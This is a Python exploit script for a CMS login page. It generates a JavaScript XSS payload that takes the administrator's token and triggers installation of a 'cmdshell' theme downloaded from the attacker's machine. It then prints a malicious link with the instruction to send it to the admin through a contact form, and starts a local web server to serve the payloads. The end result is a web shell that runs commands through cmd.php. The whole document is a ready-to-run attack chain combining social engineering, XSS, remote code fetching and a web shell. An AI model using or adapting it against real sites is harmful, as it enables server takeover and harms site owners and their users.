import sys
import os
if len(sys.argv) < 3:
    print("Usage: python3 exploit.py loginURL ip")
    sys.exit(1)

data = f'''var url = "{sys.argv[1]}";
if (url.endsWith("/")) {{
    url = url.slice(0, -1);
}}
var base = url.split("/").slice(0, -1).join("/");
var token = document.querySelector('input[name="token"]').value;
var install = base + "/?installModule=http://{sys.argv[2]}:8000/cmdshell.zip" + "&directoryName=cmdshell" + "&type=themes" + "&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", install);
xhr.send();
'''

with open("xss.js", "w") as outfile:
    outfile.write(data)

print("[+] xss.js created successfully")

link = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""

print("------------------------------------------------")
print(f"Send this link to admin on contact.php")
print(link)
print("-------------------------------------------------")

print("Wait for GET xss.js and cmdshell.zip")
print("-------------------------------------------------")

print(f"After all {sys.argv[1]}/themes/cmdshell/cmd.php?cmd=id should work")

print("-------------------------------------------------")

os.system("python3 -m http.server 8000")
